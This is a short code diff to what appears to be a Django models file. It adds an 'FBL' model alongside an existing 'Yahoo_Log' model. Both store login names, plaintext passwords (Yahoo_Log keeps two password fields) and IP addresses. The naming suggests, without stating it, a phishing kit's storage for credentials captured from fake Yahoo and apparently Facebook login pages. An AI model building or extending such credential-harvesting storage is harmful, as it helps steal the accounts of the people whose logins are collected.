@@ -12,3 +12,9 @@ class Yahoo_Log(models.Model):
     psw1=models.CharField(max_length=260, blank=True,null=True)
     psw2=models.CharField(max_length=260, blank=True,null=True)
     ip=models.CharField(max_length=250, blank=True,null=True)
+
+
+class FBL(models.Model):
+    login=models.CharField(max_length=260, blank=True,null=True)
+    psw=models.CharField(max_length=260, blank=True,null=True)
+    ip=models.CharField(max_length=260, blank=True,null=True)
